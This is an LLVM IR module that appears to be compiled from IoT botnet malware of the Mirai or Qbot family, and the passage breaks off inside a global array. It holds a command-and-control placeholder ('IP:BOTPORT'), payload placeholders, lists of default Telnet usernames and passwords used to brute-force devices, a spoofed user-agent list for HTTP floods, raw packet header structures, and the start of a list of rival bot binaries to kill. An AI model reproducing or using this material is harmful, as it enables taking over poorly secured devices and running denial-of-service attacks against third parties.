; ModuleID = 'host/ir_sub/Yummy.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.in_addr = type { i32 }
%struct.fd_set = type { [16 x i64] }
%struct.timeval = type { i64, i64 }
%struct.telstate_t = type { i32, i32, i8, i8, i8, i8, i8, i32, i16, i8* }
%struct.__va_list_tag = type { i32, i32, i8*, i8* }
%struct.hostent = type { i8*, i8**, i32, i32, i8** }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { %union.anon }
%union.anon = type { %struct.anon }
%struct.anon = type { i16, i16, i32, i32, i8, i8, i16, i16, i16 }
%struct.tcp_pseudo = type { i64, i64, i8, i8, i16 }
%struct.udphdr = type { %union.anon.1 }
%union.anon.1 = type { %struct.anon.2 }
%struct.anon.2 = type { i16, i16, i16, i16 }
%struct.anon.0 = type { i16, i16, i32, i32, i16, i16, i16, i16 }

@useragents = global [59 x i8*] [i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.1, i32 0, i32 0), i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([150 x i8], [150 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([48 x i8], [48 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([107 x i8], [107 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.13, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.14, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([173 x i8], [173 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.17, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([109 x i8], [109 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([144 x i8], [144 x i8]* @.str.21, i32 0, i32 0), i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.22, i32 0, i32 0), i8* getelementptr inbounds ([103 x i8], [103 x i8]* @.str.23, i32 0, i32 0), i8* getelementptr inbounds ([100 x i8], [100 x i8]* @.str.24, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.25, i32 0, i32 0), i8* getelementptr inbounds ([154 x i8], [154 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([112 x i8], [112 x i8]* @.str.27, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.28, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.29, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.30, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.31, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.32, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.33, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.34, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @.str.35, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.36, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.37, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.38, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.39, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.40, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.41, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.40, i32 0, i32 0), i8* getelementptr inbounds ([70 x i8], [70 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([75 x i8], [75 x i8]* @.str.44, i32 0, i32 0), i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.45, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.46, i32 0, i32 0), i8* getelementptr inbounds ([128 x i8], [128 x i8]* @.str.47, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([76 x i8], [76 x i8]* @.str.49, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.50, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.51, i32 0, i32 0), i8* getelementptr inbounds ([100 x i8], [100 x i8]* @.str.52, i32 0, i32 0), i8* getelementptr inbounds ([90 x i8], [90 x i8]* @.str.53, i32 0, i32 0), i8* getelementptr inbounds ([111 x i8], [111 x i8]* @.str.54, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @.str.55, i32 0, i32 0), i8* getelementptr inbounds ([122 x i8], [122 x i8]* @.str.56, i32 0, i32 0), i8* getelementptr inbounds ([116 x i8], [116 x i8]* @.str.57, i32 0, i32 0), i8* getelementptr inbounds ([111 x i8], [111 x i8]* @.str.58, i32 0, i32 0)], align 16
@.str.1 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36\00", align 1
@.str.2 = private unnamed_addr constant [85 x i8] c"FAST-WebCrawler/3.6 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)\00", align 1
@.str.3 = private unnamed_addr constant [150 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)\00", align 1
@.str.4 = private unnamed_addr constant [31 x i8] c"TheSuBot/0.2 (www.thesubot.de)\00", align 1
@.str.5 = private unnamed_addr constant [73 x i8] c"Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16\00", align 1
@.str.6 = private unnamed_addr constant [55 x i8] c"BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)\00", align 1
@.str.7 = private unnamed_addr constant [64 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201\00", align 1
@.str.8 = private unnamed_addr constant [85 x i8] c"FAST-WebCrawler/3.7 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)\00", align 1
@.str.9 = private unnamed_addr constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1\00", align 1
@.str.10 = private unnamed_addr constant [48 x i8] c"zspider/0.9-dev http://feedback.redkolibri.com/\00", align 1
@.str.11 = private unnamed_addr constant [107 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)\00", align 1
@.str.12 = private unnamed_addr constant [101 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)\00", align 1
@.str.13 = private unnamed_addr constant [63 x i8] c"Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51\00", align 1
@.str.14 = private unnamed_addr constant [101 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36\00", align 1
@.str.15 = private unnamed_addr constant [83 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3\00", align 1
@.str.16 = private unnamed_addr constant [173 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194ABaiduspider+(+http://www.baidu.com/search/spider.htm)\00", align 1
@.str.17 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko\00", align 1
@.str.18 = private unnamed_addr constant [80 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7\00", align 1
@.str.19 = private unnamed_addr constant [109 x i8] c"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15\00", align 1
@.str.20 = private unnamed_addr constant [82 x i8] c"Mozilla/5.0 (Android; Linux armv7l; rv:9.0) Gecko/20111216 Firefox/9.0 Fennec/9.0\00", align 1
@.str.21 = private unnamed_addr constant [144 x i8] c"Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10\00", align 1
@.str.22 = private unnamed_addr constant [60 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3)\00", align 1
@.str.23 = private unnamed_addr constant [103 x i8] c"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)\00", align 1
@.str.24 = private unnamed_addr constant [100 x i8] c"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@.str.25 = private unnamed_addr constant [65 x i8] c"Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.229 Version/11.60\00", align 1
@.str.26 = private unnamed_addr constant [154 x i8] c"Mozilla/5.0 (iPad; U; CPU OS 5_1 like Mac OS X) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B367 Safari/531.21.10 UCBrowser/3.4.3.532\00", align 1
@.str.27 = private unnamed_addr constant [112 x i8] c"Mozilla/5.0 (Nintendo WiiU) AppleWebKit/536.30 (KHTML, like Gecko) NX/3.0.4.2.12 NintendoBrowser/4.3.1.11264.US\00", align 1
@.str.28 = private unnamed_addr constant [82 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0\00", align 1
@.str.29 = private unnamed_addr constant [65 x i8] c"Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)\00", align 1
@.str.30 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00\00", align 1
@.str.31 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00\00", align 1
@.str.32 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00\00", align 1
@.str.33 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; cn) Opera 11.00\00", align 1
@.str.34 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00\00", align 1
@.str.35 = private unnamed_addr constant [110 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36\00", align 1
@.str.36 = private unnamed_addr constant [68 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.6.01001)\00", align 1
@.str.37 = private unnamed_addr constant [68 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.7.01001)\00", align 1
@.str.38 = private unnamed_addr constant [68 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.5.01003)\00", align 1
@.str.39 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0\00", align 1
@.str.40 = private unnamed_addr constant [101 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; de; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8\00", align 1
@.str.41 = private unnamed_addr constant [68 x i8] c"Mozilla/5.0 (Windows NT 5.1; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.42 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:11.0) Gecko/20100101 Firefox/11.0\00", align 1
@.str.43 = private unnamed_addr constant [70 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.0.3705)\00", align 1
@.str.44 = private unnamed_addr constant [75 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.45 = private unnamed_addr constant [84 x i8] c"Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)\00", align 1
@.str.46 = private unnamed_addr constant [71 x i8] c"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)\00", align 1
@.str.47 = private unnamed_addr constant [128 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)\00", align 1
@.str.48 = private unnamed_addr constant [65 x i8] c"Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.01\00", align 1
@.str.49 = private unnamed_addr constant [76 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)\00", align 1
@.str.50 = private unnamed_addr constant [68 x i8] c"Mozilla/5.0 (Windows NT 5.1; rv:5.0.1) Gecko/20100101 Firefox/5.0.1\00", align 1
@.str.51 = private unnamed_addr constant [65 x i8] c"Mozilla/5.0 (Windows NT 6.1; rv:5.0) Gecko/20100101 Firefox/5.02\00", align 1
@.str.52 = private unnamed_addr constant [100 x i8] c"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1\00", align 1
@.str.53 = private unnamed_addr constant [90 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.0) Opera 7.02 Bork-edition [en]\00", align 1
@.str.54 = private unnamed_addr constant [111 x i8] c"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36\00", align 1
@.str.55 = private unnamed_addr constant [110 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36\00", align 1
@.str.56 = private unnamed_addr constant [122 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36\00", align 1
@.str.57 = private unnamed_addr constant [116 x i8] c"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36\00", align 1
@.str.58 = private unnamed_addr constant [111 x i8] c"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36\00", align 1
@mainCommSock = global i32 0, align 4
@currentServer = global i32 -1, align 4
@numpids = global i64 0, align 8
@macAddress = global [6 x i8] zeroinitializer, align 1
@commServer = global [1 x i8*] [i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.59, i32 0, i32 0)], align 8
@.str.59 = private unnamed_addr constant [11 x i8] c"IP:BOTPORT\00", align 1
@Busybox_Payload = global i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.60, i32 0, i32 0), align 8
@.str.60 = private unnamed_addr constant [11 x i8] c"BB PAYLOAD\00", align 1
@Payload = global i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.61, i32 0, i32 0), align 8
@.str.61 = private unnamed_addr constant [8 x i8] c"PAYLOAD\00", align 1
@Telnet_Usernames = global [19 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.64, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.64, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.65, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.66, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.66, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.67, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.64, i32 0, i32 0)], align 16
@.str.62 = private unnamed_addr constant [6 x i8] c"root\00\00", align 1
@.str.63 = private unnamed_addr constant [9 x i8] c"default\00\00", align 1
@.str.64 = private unnamed_addr constant [7 x i8] c"admin\00\00", align 1
@.str.65 = private unnamed_addr constant [9 x i8] c"support\00\00", align 1
@.str.66 = private unnamed_addr constant [6 x i8] c"user\00\00", align 1
@.str.67 = private unnamed_addr constant [8 x i8] c"telnet\00\00", align 1
@Telnet_Passwords = global [19 x i8*] [i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.68, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.69, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.68, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.64, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.68, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.70, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.71, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.72, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.73, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.65, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.74, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.75, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.76, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.68, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.68, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.66, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.67, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.67, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.67, i32 0, i32 0)], align 16
@.str.68 = private unnamed_addr constant [2 x i8] zeroinitializer, align 1
@.str.69 = private unnamed_addr constant [10 x i8] c"S2fGqNFs\00\00", align 1
@.str.70 = private unnamed_addr constant [10 x i8] c"password\00\00", align 1
@.str.71 = private unnamed_addr constant [6 x i8] c"anko\00\00", align 1
@.str.72 = private unnamed_addr constant [10 x i8] c"hunt5759\00\00", align 1
@.str.73 = private unnamed_addr constant [10 x i8] c"OxhlwSG8\00\00", align 1
@.str.74 = private unnamed_addr constant [7 x i8] c"12345\00\00", align 1
@.str.75 = private unnamed_addr constant [14 x i8] c"7ujMko0admin\00\00", align 1
@.str.76 = private unnamed_addr constant [7 x i8] c"vizxv\00\00", align 1
@Mirai_Usernames = global [1 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0)], align 8
@Mirai_Passwords = global [1 x i8*] [i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.68, i32 0, i32 0)], align 8
@Bot_Killer_Binarys = global [355 x i8*] [i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.77, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.78, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.79, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.80, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.81, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.82, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.83, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.84, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.85, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.86, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.87, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.88, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.89, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.90, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.91, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.92, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.93, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.94, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.95, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.96, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.97, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.98, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.99, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.100, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.101, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.102, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.103, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.104, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.105, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.106, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.107, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.108, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.109, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.110, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.111, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.112, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.113, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.114, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.115, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.116, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.117, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.118, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.119, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.120, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.121, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.122, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.123, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.124, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.125, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.126, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.127, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.128, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.129, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.130, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.131, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.132, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.133, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.134, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.135, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.136, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.137, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.138, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.139, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.140, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.141, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.142, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.143, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.144, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.145, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.146, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.147, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.148, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.149, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.150, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.151, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.152, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.153, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.154, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.155, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.156, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.157, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.158, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.159, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.160, i32 0, i32 0), 